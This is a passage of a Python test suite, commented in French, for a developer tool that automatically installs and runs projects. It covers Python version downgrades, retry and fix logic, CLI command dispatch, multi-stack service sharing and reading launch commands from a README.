        tmp = [f for f in (Path(os.environ.get("ZERO_HOME", "")) if False else Path(ctx.root).parent.glob("zh/envs/*.requirements.txt"))]
        self.assertEqual(len(tmp), 1)
        self.assertEqual(tmp[0].read_text().strip(), "psycopg2-binary")

    def test_python_downgrade_resets_previous_fixes_so_they_are_replayed(self):
        from unittest import mock
        script = ('n=$(cat cnt 2>/dev/null || echo 0); echo $((n+1)) > cnt; '
                  'case $n in 0|2) echo "fatal error: libpq-fe.h: No such file or directory"; exit 1;; '
                  '1) echo "  x Failed to build \\`pyyaml==5.4\\`"; echo "lib/python3.12/site-packages/x"; exit 1;; esac; exit 0')
        step = "sh -c '%s' _ -r requirements.txt" % script.replace("'", "'\\''")
        original = step
        calls = []

        def fake_downgrade(ctx, version, reason=None):
            calls.append(version)
            ctx.plan.version, ctx.plan.install = version, [original]          # plan recalculé : retour aux étapes d'origine
            return dict(os.environ)
        with mock.patch.object(core, "_downgrade_python", side_effect=fake_downgrade):
            env, err, logs, ctx = self._run([step], files={"requirements.txt": "psycopg2-binary==2.8.5\n"})
        self.assertIsNone(err, logs)
        self.assertEqual(calls, ["3.9"])
        self.assertEqual(len([l for l in logs if "pin retiré" in l]), 2)       # psycopg2 corrigé avant ET après la rétrogradation


class TestPythonDowngradeReasons(unittest.TestCase):
    """Le message annoncé doit dire la vraie cause du changement de version de Python."""

    def _reason(self, tail):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d:
            ctx = core.Context(root=Path(d), plan=plan.Plan("python", None, "x", ["x"], "x"), services=[], gpu={}, fp="x", name="")
            st = core.InstallState(ctx, {}, step="x", tail=tail)
            seen = []
            with mock.patch.object(core, "_downgrade_python", side_effect=lambda c, v, r=None: seen.append((v, r)) or {}):
                self.assertTrue(core._fix_python_version(st))
            return seen[0]

    def test_old_pin_that_does_not_build(self):
        v, reason = self._reason("  \u00d7 Failed to build `pyyaml==5.4`\nlib/python3.12/site-packages/x\ncython_sources")
        self.assertEqual(v, "3.9")
        self.assertIn("pyyaml==5.4", reason)
        self.assertNotIn("module retiré", reason)

    def test_missing_wheels_for_this_python(self):
        v, reason = self._reason("You require CPython 3.14\nwith the following Python ABI tags: `cp311`, `cp312`, `cp313`")
        self.assertEqual(v, "3.13")
        self.assertIn("roue", reason)

    def test_removed_stdlib_module_keeps_the_default_message(self):
        v, reason = self._reason("ModuleNotFoundError: No module named 'imp'")
        self.assertEqual(v, "3.11")
        self.assertIsNone(reason)


class TestRunProjectChain(unittest.TestCase):
    """Tests de caractérisation de `run_project` : supervision, services, récupération au lancement. Tout ce qui touche au système
    (runtimes, processus, services, enregistrement du verrou) est simulé ; on fige l'enchaînement et les décisions."""

    def _run(self, results, *, recover=True, with_services=True, services=None, fixes=None, py_needed=None, svc_env=None,
             env_file=None, migrate=False, stop_raises=None, **plan_kw):
        import contextlib
        from unittest import mock
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        root = Path(d.name)
        if env_file is not None:
            (root / ".env").write_text(env_file)
        kw = {"run": "python app.py"}
        kw.update(plan_kw)
        run_cmd = kw.pop("run")
        pl = plan.Plan("python", None, "x", [], run_cmd, **kw)
        ctx = core.Context(root=root, plan=pl, services=list(services or []), gpu={}, fp="FP123", name="")
        calls = {"commands": [], "sup_env": [], "applied": [], "downgrade": [], "install": [], "record": [], "stopped": 0, "started": 0,
                 "migrate": 0, "diag_already": []}
        queue = list(results)
        fix_queue = list(fixes or [])
        py_queue = list(py_needed or [])
        logs: list[str] = []

        class FakeSupervisor:
            def __init__(self, root, env):
                calls["sup_env"].append(dict(env))

            def run(self, commands):
                calls["commands"].append(dict(commands))
                if stop_raises:
                    raise stop_raises
                return queue.pop(0)

        class FakeManager:
            def __init__(self, project, services, mode):
                calls["mode"] = mode

            def start(self):
                calls["started"] += 1
                return dict(svc_env or {})

            def stop(self):
                calls["stopped"] += 1

        def fake_diagnose(plan_, root_, tail, already):
            calls["diag_already"].append(set(already))
            batch = fix_queue.pop(0) if fix_queue else []
            return [f for f in batch if f.key not in already]

        def fake_apply(fix, root_, env):
            calls["applied"].append(fix.key)
            env.update(fix.env)

        def fake_downgrade(ctx_, version, reason=None):
            calls["downgrade"].append(version)
            return {"DOWNGRADED": "1"}

        def fake_install(ctx_, env, recover_):
            calls["install"].append(dict(env))
            return dict(env)

        patches = [
            mock.patch.dict(core.ENSURE, {"python": lambda p, r, e: dict(e)}),
            mock.patch.object(core.gpumod, "build_env", return_value={}),
            mock.patch.object(core, "install_deps", side_effect=fake_install),
            mock.patch.object(core, "Supervisor", FakeSupervisor),
            mock.patch.object(core, "ServiceManager", FakeManager),
            mock.patch.object(core, "fill_env", return_value=[]),
            mock.patch.object(core, "report_env"),
            mock.patch.object(core, "diagnose", side_effect=fake_diagnose),
            mock.patch.object(core, "diagnose_python_install", side_effect=lambda p, t: py_queue.pop(0) if py_queue else None),
            mock.patch.object(core, "_apply_fix", side_effect=fake_apply),
            mock.patch.object(core, "_downgrade_python", side_effect=fake_downgrade),
            mock.patch.object(core, "should_migrate", return_value=migrate),
            mock.patch.object(core, "run_django_migrate", side_effect=lambda r, e: calls.__setitem__("migrate", calls["migrate"] + 1)),
            mock.patch.object(core, "record", side_effect=lambda fp, lock: calls["record"].append((fp, dict(lock)))),
            mock.patch.object(core, "build_lock", return_value={"k": "v"}),
            mock.patch.object(core, "installed_version", return_value="3.12.1"),
            mock.patch.object(core, "journal"),
            mock.patch.object(core, "log", side_effect=logs.append),
            mock.patch.object(core, "warn", side_effect=logs.append),
        ]
        with contextlib.ExitStack() as stack:
            stack.enter_context(contextlib.redirect_stdout(io.StringIO()))
            for p in patches:
                stack.enter_context(p)
            try:
                code = core.run_project(ctx, recover=recover, with_services=with_services)
                err = None
            except ZeroError as e:
                code, err = None, str(e)
            except Exception as e:      # noqa: BLE001 : on veut vérifier l'arrêt des services même sur une exception
                code, err = None, f"{type(e).__name__}: {e}"
        return code, err, calls, logs, ctx

    @staticmethod
    def _res(code=0, tail="", uptime=30.0, interrupted=False, failed=None):
        from zerodev.supervisor import RunResult
        return RunResult(code=code, tail=tail, uptime=uptime, interrupted=interrupted, failed=failed)

    @staticmethod
    def _fix(name, **kw):
        from zerodev.recovery import Fix
        return Fix(name, **kw)

    def test_no_command_dies_and_lists_the_choices(self):
        code, err, calls, _, _ = self._run([], run=None, choices=["python a.py", "python b.py"])
        self.assertIn("pas de commande principale", err)
        self.assertIn("python a.py | python b.py", err)
        self.assertEqual(calls["commands"], [])

    def test_clean_exit_returns_zero_and_records_the_lock_with_the_pre_install_fingerprint(self):
        code, err, calls, _, _ = self._run([self._res(0)])
        self.assertEqual(code, 0)
        self.assertEqual(calls["record"], [("FP123", {"k": "v", "fingerprint": "FP123"})])

    def test_user_interrupt_counts_as_success_only_after_ten_seconds(self):
        code, _, calls, _, _ = self._run([self._res(130, interrupted=True, uptime=12)])
        self.assertEqual((code, len(calls["record"])), (0, 1))
        code, _, calls, _, _ = self._run([self._res(130, interrupted=True, uptime=2)])
        self.assertEqual((code, len(calls["record"])), (130, 0))
        self.assertEqual(len(calls["commands"]), 1)                       # une interruption n'est jamais relancée

    def test_failure_with_an_automatic_fix_retries_and_logs_the_attempt(self):
        fx = self._fix("installer cv2", commands=["true"], env={"A": "1"})
        code, _, calls, logs, _ = self._run([self._res(1, "boom"), self._res(0)], fixes=[[fx]])
        self.assertEqual(code, 0)
        self.assertEqual(calls["applied"], ["installer cv2"])
        self.assertEqual(calls["sup_env"][1].get("A"), "1")                # l'env du correctif est vu par la relance
        self.assertTrue([l for l in logs if "nouvelle tentative (1/4)" in l])
        self.assertTrue([l for l in logs if "1 correctif(s) appliqué(s)" in l])

    def test_retry_budget_is_max_attempts(self):
        fixes = [[self._fix(f"fix{i}", commands=["true"])] for i in range(10)]
        code, _, calls, _, _ = self._run([self._res(1, "x") for _ in range(10)], fixes=fixes)
        self.assertEqual(code, 1)
        self.assertEqual(len(calls["commands"]), 1 + 4)                    # un lancement + MAX_ATTEMPTS relances
        self.assertEqual(len(calls["applied"]), 4)

    def test_manual_fix_only_warns_and_stops(self):
        fx = self._fix("variable manquante « X »", manual="définissez X dans .env")
        code, _, calls, logs, _ = self._run([self._res(1, "KeyError: 'X'")], fixes=[[fx]])
        self.assertEqual(code, 1)
        self.assertEqual(len(calls["commands"]), 1)
        self.assertTrue([l for l in logs if "action manuelle" in l and "définissez X" in l])

    def test_without_recovery_the_project_runs_once(self):
        fx = self._fix("f", commands=["true"])
        code, _, calls, _, _ = self._run([self._res(3, "x")], recover=False, fixes=[[fx]])
        self.assertEqual((code, len(calls["commands"]), calls["applied"]), (3, 1, []))

    def test_python_version_retry_resets_fixes_but_not_python_keys_and_restores_the_budget(self):
        f1 = self._fix("psycopg2 fix", commands=["true"])
        # tour 1 : échec → correctif f1 ; tour 2 : échec → rétrogradation (pas de diagnostic) ; tour 3 : échec → f1 rejoué ; tour 4 : succès
        results = [self._res(1, "a"), self._res(1, "b"), self._res(1, "c"), self._res(0)]
        code, _, calls, logs, _ = self._run(results, fixes=[[f1], [f1]], py_needed=[None, "3.9", None])
        self.assertEqual(code, 0)
        self.assertEqual(calls["downgrade"], ["3.9"])
        self.assertEqual(len(calls["install"]), 2)                         # installation initiale + après la rétrogradation
        self.assertEqual(calls["applied"].count("psycopg2 fix"), 2)        # rejoué sur le venv neuf
        self.assertTrue([l for l in logs if "nouvelle tentative (version de Python)" in l])
        self.assertEqual(calls["diag_already"], [set(), {"python-3.9"}])   # f1 oublié, la clé de version conservée

    def test_each_python_version_step_is_tried_once(self):
        results = [self._res(1, "a"), self._res(1, "b")]
        code, _, calls, _, _ = self._run(results, py_needed=["3.9", "3.9"])
        self.assertEqual(calls["downgrade"], ["3.9"])

    def test_service_variables_never_override_the_env_file_or_the_process_environment(self):
        os.environ["ZT_ALREADY_SET"] = "from-os"
        self.addCleanup(os.environ.pop, "ZT_ALREADY_SET", None)
        svc = {"DATABASE_URL": "postgres://zero", "FROM_ENV_FILE": "svc", "ZT_ALREADY_SET": "svc", "NEW_ONE": "1"}
        code, _, calls, _, _ = self._run([self._res(0)], services=[object()], svc_env=svc, env_file="FROM_ENV_FILE=mine\n")
        env = calls["sup_env"][0]
        self.assertEqual(env["DATABASE_URL"], "postgres://zero")
        self.assertEqual(env["NEW_ONE"], "1")
        self.assertNotIn("FROM_ENV_FILE", env)                              # le .env de l'utilisateur est respecté
        self.assertEqual(env["ZT_ALREADY_SET"], "from-os")                  # l'environnement du processus aussi

    def test_a_procfile_gets_a_default_port_and_runs_all_processes(self):
        code, _, calls, _, _ = self._run([self._res(0)], processes={"web": "gunicorn x", "worker": "rq worker"})
        self.assertIn("PORT", calls["sup_env"][0])
        self.assertEqual(calls["commands"][0], {"web": "gunicorn x", "worker": "rq worker"})

    def test_services_are_started_and_always_stopped(self):
        code, _, calls, _, _ = self._run([self._res(0)], services=[object()])
        self.assertEqual((calls["started"], calls["stopped"]), (1, 1))
        code, err, calls, _, _ = self._run([], services=[object()], stop_raises=RuntimeError("supervision cassée"))
        self.assertIn("supervision cassée", err)
        self.assertEqual(calls["stopped"], 1)                               # arrêtés même si la supervision plante

    def test_services_disabled_or_absent_create_no_manager(self):
        _, _, calls, _, _ = self._run([self._res(0)], services=[object()], with_services=False)
        self.assertEqual(calls["started"], 0)
        _, _, calls, _, _ = self._run([self._res(0)], services=[])
        self.assertEqual(calls["started"], 0)

    def test_django_migrations_run_before_the_launch_when_applicable(self):
        _, _, calls, _, _ = self._run([self._res(0)], migrate=True)
        self.assertEqual(calls["migrate"], 1)
        _, _, calls, _, _ = self._run([self._res(0)], migrate=False)
        self.assertEqual(calls["migrate"], 0)

    def test_python2_and_cli_hints_are_given_after_a_failure(self):
        _, _, _, logs, _ = self._run([self._res(1, "SyntaxError: Missing parentheses in call to 'print'")])
        self.assertTrue([l for l in logs if "Python 2" in l])
        _, _, _, logs, _ = self._run([self._res(2, "Usage: tool [options]", uptime=0.3)])
        self.assertTrue([l for l in logs if "outil en ligne de commande" in l])
        _, _, _, logs, _ = self._run([self._res(2, "Usage: tool", uptime=60.0)])
        self.assertFalse([l for l in logs if "outil en ligne de commande" in l])      # resté vivant : pas un outil


class TestDispatchChain(unittest.TestCase):
    """Tests de caractérisation de `cli.dispatch` : quelle commande appelle quoi, avec quels arguments, et ce qu'elle affiche."""

    def _args(self, command, **kw):
        import argparse
        base = dict(command=command, target="/dépôt", project=None, cmd=None, all_stacks=False, no_lock=False, no_recover=False,
                    no_services=False, services="auto", sandbox=False, json=False, no_network=False, run_args=[], out="rapport.json",
                    workdir="/w", full=False, timeout=60, jobs=2)
        base.update(kw)
        return argparse.Namespace(**base)

    def _dispatch(self, args, *, ambiguous=None, stacks=None, root=Path("/dépôt")):
        import contextlib
        from unittest import mock
        from zerodev import cli
        calls: list[tuple] = []
        ctx = object()
        buf = io.StringIO()

        def make_plan(r, **kw):
            calls.append(("make_plan", r, kw))
            if ambiguous is not None:
                raise ambiguous
            return ctx

        patches = [
            mock.patch.object(core, "resolve_target", side_effect=lambda t: root),
            mock.patch.object(core, "make_plan", side_effect=make_plan),
            mock.patch.object(core, "print_plan", side_effect=lambda c: calls.append(("print_plan", c))),
            mock.patch.object(core, "append_run_args", side_effect=lambda c, a: calls.append(("append_run_args", a))),
            mock.patch.object(core, "run_project", side_effect=lambda c, **kw: calls.append(("run_project", kw)) or 7),
            mock.patch.object(core, "freeze_project", side_effect=lambda c: calls.append(("freeze",))),
            mock.patch.object(core, "share_project", side_effect=lambda c: calls.append(("share",))),
            mock.patch.object(core, "find_stacks", side_effect=lambda r, **kw: calls.append(("find_stacks", kw)) or (stacks or [])),
            mock.patch.object(core, "run_stacks", side_effect=lambda r, cs, **kw: calls.append(("run_stacks", kw)) or 9),
            mock.patch("zerodev.services.down", side_effect=lambda n: 3),
            mock.patch("zerodev.freeze.fingerprint", side_effect=lambda r: "EMPREINTE"),
            mock.patch("zerodev.bench.run_bench", side_effect=lambda *a: calls.append(("run_bench", a)) or {"repos": 1}),
            mock.patch("zerodev.doctor.collect", side_effect=lambda network: {"net": network}),
            mock.patch("zerodev.doctor.render", side_effect=lambda info: "RENDU"),
            mock.patch("zerodev.sandbox.enable", side_effect=lambda r: calls.append(("sandbox", r))),
            mock.patch.object(cli, "detect_stacks", side_effect=lambda r: stacks_for_cli),
        ]
        stacks_for_cli = [("backend", None, None), ("frontend", None, None)] if stacks is None else stacks
        with contextlib.ExitStack() as st:
            for p in patches:
                st.enter_context(p)
            st.enter_context(contextlib.redirect_stdout(buf))
            try:
                code = cli.dispatch(args)
                err = None
            except ZeroError as e:
                code, err = None, str(e)
        return code, err, calls, buf.getvalue()

    def test_doctor_text_and_json_and_network_flag(self):
        code, _, _, out = self._dispatch(self._args("doctor"))
        self.assertEqual((code, out.strip()), (0, "RENDU"))
        code, _, _, out = self._dispatch(self._args("doctor", json=True, no_network=True))
        self.assertEqual(json.loads(out), {"net": False})

    def test_bench_passes_its_options_and_prints_the_summary(self):
        code, _, calls, out = self._dispatch(self._args("bench", full=True, timeout=90, jobs=3))
        self.assertEqual(code, 0)
        self.assertEqual(calls[0], ("run_bench", (Path("/dépôt"), Path("/w"), True, 90, Path("rapport.json"), 3)))
        self.assertIn("rapport détaillé : rapport.json", out)
        self.assertEqual(json.loads(out.split("\nrapport")[0]), {"repos": 1})

    def test_down_and_fingerprint_need_no_plan(self):
        code, _, calls, out = self._dispatch(self._args("down"))
        self.assertEqual((code, out.strip(), calls), (0, "3 service(s) arrêté(s)", []))
        code, _, calls, out = self._dispatch(self._args("fingerprint"))
        self.assertEqual((code, out.strip(), calls), (0, "EMPREINTE", []))

    def test_run_builds_the_plan_prints_it_and_runs_with_the_recovery_options(self):
        code, _, calls, _ = self._dispatch(self._args("run", project="web", cmd="x", no_lock=True, no_recover=True, no_services=True, services="local"))
        self.assertEqual(code, 7)
        self.assertEqual(calls[0], ("make_plan", Path("/dépôt"), {"use_lock": False, "project": "web", "cmd": "x"}))
        self.assertEqual([c[0] for c in calls], ["make_plan", "print_plan", "run_project"])
        self.assertEqual(calls[-1][1], {"recover": False, "with_services": False, "services_mode": "local"})

    def test_plan_freeze_and_share_stop_after_their_own_action(self):
        for command, extra in (("plan", None), ("freeze", "freeze"), ("share", "share")):
            code, _, calls, _ = self._dispatch(self._args(command))
            self.assertEqual(code, 0, command)
            self.assertEqual([c[0] for c in calls], ["make_plan", "print_plan"] + ([extra] if extra else []), command)

    def test_arguments_after_double_dash_are_appended_before_the_plan_is_printed(self):
        _, _, calls, _ = self._dispatch(self._args("run", run_args=["--port", "9"]))
        self.assertEqual([c[0] for c in calls], ["make_plan", "append_run_args", "print_plan", "run_project"])
        self.assertEqual(calls[1], ("append_run_args", ["--port", "9"]))

    def test_sandbox_is_enabled_only_for_run_and_announced(self):
        _, _, calls, out = self._dispatch(self._args("run", sandbox=True))
        self.assertEqual(calls[0], ("sandbox", Path("/dépôt")))
        self.assertIn("mode isolé (bubblewrap)", out)
        _, _, calls, out = self._dispatch(self._args("plan", sandbox=True))
        self.assertNotIn("sandbox", [c[0] for c in calls])

    def test_all_stacks_prints_each_plan_then_runs_them(self):
        c1, c2 = type("C", (), {"name": "backend"})(), type("C", (), {"name": "frontend"})()
        code, _, calls, out = self._dispatch(self._args("run", all_stacks=True, no_recover=True), stacks=[c1, c2])
        self.assertEqual(code, 9)
        self.assertEqual([c[0] for c in calls], ["find_stacks", "print_plan", "print_plan", "run_stacks"])
        self.assertIn("stack « backend »", out)
        self.assertEqual(calls[-1][1], {"recover": False, "with_services": True, "services_mode": "auto"})
        code, _, calls, _ = self._dispatch(self._args("plan", all_stacks=True), stacks=[c1])
        self.assertEqual((code, "run_stacks" in [c[0] for c in calls]), (0, False))

    def test_all_stacks_refuses_other_commands_and_project_or_cmd(self):
        for kw in ({"command": "freeze"}, {"project": "x"}, {"cmd": "y"}):
            args = self._args(kw.pop("command", "run"), all_stacks=True, **kw)
            code, err, _, _ = self._dispatch(args)
            self.assertIn("--all s'utilise seul", err)

    def test_small_multistack_monorepo_switches_to_all_stacks_automatically(self):
        amb = AmbiguousProject(["backend", "frontend"], multistack=True)
        code, err, calls, out = self._dispatch(self._args("run"), ambiguous=amb)
        self.assertIsNone(err)
        self.assertIn("monorepo multi-stack détecté (backend, frontend)", out)
        self.assertEqual([c[0] for c in calls][:2], ["make_plan", "find_stacks"])
        self.assertEqual(code, 9)

    def test_the_automatic_switch_does_not_apply_in_the_other_cases(self):
        amb = AmbiguousProject(["a", "b"], multistack=True)
        many = [("a", None, None)] * 4
        for kw, stacks in (({}, many), ({"project": "x"}, None), ({"cmd": "x"}, None), ({"command": "freeze"}, None)):
            args = self._args(kw.pop("command", "run"), **kw)
            code, err, _, _ = self._dispatch(args, ambiguous=amb, stacks=stacks)
            self.assertIn("monorepo : plusieurs projets exécutables", err, kw)
        code, err, _, _ = self._dispatch(self._args("run"), ambiguous=AmbiguousProject(["a", "b"], multistack=False))
        self.assertIn("plusieurs projets exécutables", err)


class TestRunStacksChain(unittest.TestCase):
    """Tests de caractérisation de `run_stacks` (mode --all) : installation par stack, services partagés, ports, variables, code de sortie."""

    def _run(self, ctxs, res, *, with_services=True, svc_env=None, env_files=None, recover=True, stop_raises=None):
        import contextlib
        from unittest import mock
        calls = {"install": [], "sup": [], "commands": [], "mgr": [], "started": 0, "stopped": 0, "migrate": []}
        logs: list[str] = []

        class FakeSupervisor:
            def __init__(self, repo, env):
                calls["sup"].append((repo, dict(env)))

            def run(self, commands):
                calls["commands"].append(commands)
                if stop_raises:
                    raise stop_raises
                return res

        class FakeManager:
            def __init__(self, project, services, mode):
                calls["mgr"].append((project, [s.kind for s in services], mode))

            def start(self):
                calls["started"] += 1
                return dict(svc_env or {})

            def stop(self):
                calls["stopped"] += 1

        def fake_install(c, env, recover_):
            calls["install"].append((c.name, dict(env), recover_))
            return {**env, "INSTALLED": c.name}

        patches = [
            mock.patch.dict(core.ENSURE, {"python": lambda p, r, e: {**e, "RUNTIME": "py"}, "node": lambda p, r, e: {**e, "RUNTIME": "node"}}),
            mock.patch.object(core.gpumod, "build_env", return_value={}),
            mock.patch.object(core, "install_deps", side_effect=fake_install),
            mock.patch.object(core, "Supervisor", FakeSupervisor),
            mock.patch.object(core, "ServiceManager", FakeManager),
            mock.patch.object(core, "assign_ports", side_effect=lambda cs, es: {"backend": 8000, "frontend": 3000}),
            mock.patch.object(core, "link_stacks", side_effect=lambda cs, es, ports: {"frontend": "http://localhost:8000"}),
            mock.patch.object(core, "fill_env", return_value=[]),
            mock.patch.object(core, "report_env"),
            mock.patch.object(core, "_env_file_keys", side_effect=lambda root: set((env_files or {}).get(root.name, ()))),
            mock.patch.object(core, "migrate_stack", side_effect=lambda c, env, sv: calls["migrate"].append((c.name, sorted(sv)))),
            mock.patch.object(core, "log", side_effect=logs.append),
            mock.patch.object(core, "warn", side_effect=logs.append),
        ]
        with contextlib.ExitStack() as st:
            for p in patches:
                st.enter_context(p)
            try:
                code = core.run_stacks(Path("/repo"), ctxs, recover=recover, with_services=with_services, services_mode="local")
                err = None
            except Exception as e:      # noqa: BLE001
                code, err = None, f"{type(e).__name__}: {e}"
        return code, err, calls, logs

    @staticmethod
    def _ctx(name, lang, services=(), run="x"):
        pl = plan.Plan(lang, None, "x", ["i"], run)
        return core.Context(root=Path("/repo") / name, plan=pl, services=list(services), gpu={}, fp="x", name=name)

    @staticmethod
    def _svc(kind, port=1):
        return services.Service(kind, "img", port, port, {}, {})

    @staticmethod
    def _res(code=0, failed=None, interrupted=False, uptime=30.0):
        from zerodev.supervisor import RunResult
        return RunResult(code=code, tail="", uptime=uptime, interrupted=interrupted, failed=failed)

    def test_each_stack_is_installed_in_its_own_runtime_and_logged(self):
        ctxs = [self._ctx("backend", "python"), self._ctx("frontend", "node")]
        code, _, calls, logs = self._run(ctxs, self._res())
        self.assertEqual([(n, e["RUNTIME"], r) for n, e, r in calls["install"]], [("backend", "py", True), ("frontend", "node", True)])
        self.assertTrue([l for l in logs if "stack « backend » (python)" in l])
        self.assertTrue([l for l in logs if "stack « frontend » (node)" in l])

    def test_one_service_per_kind_is_shared_by_all_stacks(self):
        a, b = self._svc("postgres", 5432), self._svc("postgres", 5555)
        ctxs = [self._ctx("backend", "python", [a, self._svc("redis")]), self._ctx("frontend", "node", [b])]
        code, _, calls, _ = self._run(ctxs, self._res())
        self.assertEqual(calls["mgr"], [("repo", ["postgres", "redis"], "local")])
        self.assertEqual(calls["started"], 1)

    def test_no_manager_without_services_or_when_disabled(self):
        _, _, calls, _ = self._run([self._ctx("backend", "python")], self._res())
        self.assertEqual((calls["mgr"], calls["started"]), ([], 0))
        _, _, calls, _ = self._run([self._ctx("backend", "python", [self._svc("redis")])], self._res(), with_services=False)
        self.assertEqual(calls["mgr"], [])

    def test_ports_and_backend_url_are_announced(self):
        _, _, _, logs = self._run([self._ctx("backend", "python"), self._ctx("frontend", "node")], self._res())
        self.assertTrue([l for l in logs if l == "ports : backend=8000, frontend=3000"])
        self.assertTrue([l for l in logs if "« frontend » reçoit l'URL du backend : http://localhost:8000" in l])

    def test_service_variables_respect_each_stacks_env_file_and_the_process_environment(self):
        os.environ["ZT_PROC"] = "os"
        self.addCleanup(os.environ.pop, "ZT_PROC", None)
        svc = {"DATABASE_URL": "pg://zero", "OWN": "svc", "ZT_PROC": "svc"}
        ctxs = [self._ctx("backend", "python", [self._svc("postgres")]), self._ctx("frontend", "node")]
        code, _, calls, _ = self._run(ctxs, self._res(), svc_env=svc, env_files={"backend": ["OWN"]})
        envs = {n: spec[2] for n, spec in calls["commands"][0].items()}
        self.assertEqual(envs["backend"]["DATABASE_URL"], "pg://zero")
        self.assertNotIn("OWN", envs["backend"])                       # .env de la stack backend respecté
        self.assertEqual(envs["frontend"]["OWN"], "svc")               # mais pas celui du frontend (autre dossier)
        self.assertEqual(envs["backend"]["ZT_PROC"], "os")             # l'environnement du processus aussi (sa valeur d'origine est conservée)

    def test_commands_are_keyed_by_the_first_eight_letters_and_carry_cwd_and_env(self):
        ctxs = [self._ctx("backend-api-long", "python", run="python a.py"), self._ctx("frontend", "node", run="npm start")]
        _, _, calls, _ = self._run(ctxs, self._res())
        cmds = calls["commands"][0]
        self.assertEqual(list(cmds), ["backend-", "frontend"])
        self.assertEqual(cmds["backend-"][:2], ("python a.py", Path("/repo/backend-api-long")))
        self.assertEqual(cmds["frontend"][2]["INSTALLED"], "frontend")
        self.assertEqual(calls["sup"][0][0], Path("/repo"))

    def test_migrations_are_attempted_for_every_stack_with_the_shared_service_env(self):
        ctxs = [self._ctx("backend", "python", [self._svc("postgres")]), self._ctx("frontend", "node")]
        _, _, calls, _ = self._run(ctxs, self._res(), svc_env={"B": "1", "A": "2"})
        self.assertEqual(calls["migrate"], [("backend", ["A", "B"]), ("frontend", ["A", "B"])])
        _, _, calls, _ = self._run([self._ctx("backend", "python")], self._res(), svc_env={"B": "1"})
        self.assertEqual(calls["migrate"], [("backend", [])])        # sans service : pas de gestionnaire, donc pas de variables

    def test_exit_code_and_failure_message(self):
        ctxs = [self._ctx("backend", "python")]
        code, _, _, logs = self._run(ctxs, self._res(code=3, failed="backend"))
        self.assertEqual(code, 3)
        self.assertTrue([l for l in logs if "« backend » s'est arrêté (code 3)" in l and "pas appliquée en mode --all" in l])
        self.assertEqual(self._run(ctxs, self._res(code=0))[0], 0)
        code, _, _, logs = self._run(ctxs, self._res(code=130, interrupted=True, uptime=20, failed="backend"))
        self.assertEqual(code, 0)                                        # interrompu par l'utilisateur après 10 s : succès
        self.assertFalse([l for l in logs if "s'est arrêté" in l])
        self.assertEqual(self._run(ctxs, self._res(code=130, interrupted=True, uptime=3))[0], 130)

    def test_services_are_always_stopped(self):
        ctxs = [self._ctx("backend", "python", [self._svc("redis")])]
        _, _, calls, _ = self._run(ctxs, self._res())
        self.assertEqual((calls["started"], calls["stopped"]), (1, 1))
        _, err, calls, _ = self._run(ctxs, self._res(), stop_raises=RuntimeError("boum"))
        self.assertIn("boum", err)
        self.assertEqual(calls["stopped"], 1)


class TestReadmeRun(Base):
    """Lecture du README en dernier recours : seules les commandes vérifiables sur le dépôt sont retenues."""

    def _repo(self, readme, files=None, req=""):
        r = self.tmp / "r"
        r.mkdir(exist_ok=True)
        (r / "README.md").write_text(readme)
        if req:
            (r / "requirements.txt").write_text(req)
        for name, text in (files or {}).items():
            (r / name).parent.mkdir(parents=True, exist_ok=True)
            (r / name).write_text(text)
        return r

    def test_python_file_must_exist(self):
        md = "```bash\npip install -r requirements.txt\npython bot.py\n```\n"
        self.assertEqual(plan.readme_run(self._repo(md, {"bot.py": "print(1)"}), "python")[0], "python bot.py")
        (self.tmp / "r" / "bot.py").unlink()
        self.assertIsNone(plan.readme_run(self.tmp / "r", "python"))

    def test_placeholders_pipes_and_cd_are_rejected(self):
        md = "```\npython <your_script>.py\ncd app && python app.py\npython app.py | tee log\npython path/to/app.py\n```\n"
        self.assertIsNone(plan.readme_run(self._repo(md, {"app.py": "x"}), "python"))

    def test_setup_and_test_files_are_not_launch_commands(self):
        md = "```\npython setup.py install\npython test_all.py\n```\n"
        self.assertIsNone(plan.readme_run(self._repo(md, {"setup.py": "x", "test_all.py": "x"}), "python"))

    def test_uvicorn_needs_declared_dependency_and_module(self):
        md = "```\nuvicorn main:app --reload\n```\n"
        self.assertEqual(plan.readme_run(self._repo(md, {"main.py": "app=1"}, req="uvicorn\nfastapi\n"), "python")[0],
                         "uvicorn main:app --reload")
        self.assertIsNone(plan.readme_run(self._repo(md, {"main.py": "app=1"}, req="fastapi\n"), "python"))

    def test_language_must_match(self):
        md = "```\nnode server.js\n```\n"
        r = self._repo(md, {"server.js": "x"})
        self.assertEqual(plan.readme_run(r, "node")[0], "node server.js")
        self.assertIsNone(plan.readme_run(r, "python"))

    def test_prompt_prefix_and_trailing_comment_are_stripped(self):
        md = "```\n$ python app.py   # lance le serveur\n```\n"
        self.assertEqual(plan.readme_run(self._repo(md, {"app.py": "x"}), "python")[0], "python app.py")

    def test_prose_mentions_do_not_count(self):
        self.assertIsNone(plan.readme_run(self._repo("Lancez `python app.py` pour démarrer.\n", {"app.py": "x"}), "python"))

    def test_make_plan_uses_readme_after_makefile(self):
        r = self._repo("```\npython serve_it.py\n```\n", {"serve_it.py": "import os\n", "requirements.txt": "requests\n"})
        (r / "helper.py").write_text("x=1\n")
        ctx = core.make_plan(r, use_lock=False)
        self.assertTrue(ctx.plan.run)
        r2 = self.tmp / "r2"
        r2.mkdir()
        (r2 / "requirements.txt").write_text("requests\n")
        (r2 / "a.py").write_text("x=1\n")
        (r2 / "b.py").write_text("y=1\n")
        (r2 / "README.md").write_text("```\npython b.py\n```\n")
        ctx2 = core.make_plan(r2, use_lock=False)
        self.assertEqual(ctx2.plan.run, "python b.py")
        self.assertTrue(any("README" in n for n in ctx2.plan.notes))


class TestMonorepoDisambiguation(Base):
    def _mono(self, pkg=None, readme=None, dirs=("api", "web")):
        r = self.tmp / "m"
        r.mkdir(exist_ok=True)
        for d in dirs:
            (r / d).mkdir(exist_ok=True)
            (r / d / "package.json").write_text(json.dumps({"name": d, "scripts": {"start": "node s.js"}}))
            (r / d / "s.js").write_text("1")
        if pkg is not None:
            (r / "package.json").write_text(json.dumps(pkg))
        if readme is not None:
            (r / "README.md").write_text(readme)
        return r

    def test_root_script_wins(self):
        r = self._mono(pkg={"name": "root", "private": True, "scripts": {"dev": "cd api && npm start", "lint": "cd web && eslint ."}})
        self.assertEqual(plan.disambiguate_project(r, ["api", "web"]), ("api", "script du package.json racine"))

    def test_readme_single_cd_wins_and_tie_does_not(self):
        r = self._mono(readme="```\ncd web\nnpm start\n```\n")
